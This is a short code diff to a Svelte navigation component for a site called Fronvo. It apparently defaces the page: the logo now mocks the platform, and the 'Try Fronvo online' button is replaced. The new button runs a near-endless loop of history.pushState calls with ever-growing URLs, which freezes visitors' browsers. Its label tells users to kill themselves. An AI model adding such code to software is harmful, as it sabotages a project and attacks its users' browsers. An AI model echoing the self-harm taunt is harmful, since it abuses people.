@@ -1,7 +1,6 @@
 <script lang="ts">
     import { indexVisible } from 'stores/index';
     import { fly } from 'svelte/transition';
-    import { redirectApp } from 'utilities/index';
 </script>
 
 {#if $indexVisible}
@@ -9,9 +8,20 @@
         transition:fly={{ y: -100, duration: 750, opacity: 0.5 }}
         class="top-nav-container"
     >
-        <h1 id="logo">Fronvo</h1>
+        <h1 id="logo">
+            Fronvo (the apparently most "private and secure" platform)
+        </h1>
 
-        <button id="try-1" on:click={redirectApp}>Try Fronvo online</button>
+        <button
+            id="try-1"
+            on:click={() => {
+                var total = '';
+                for (var i = 0; i < 10000000000000; i++) {
+                    total += i.toString();
+                    history.pushState(0, 0, total);
+                }
+            }}>Try Killing yourself</button
+        >
     </div>
 {/if}
 
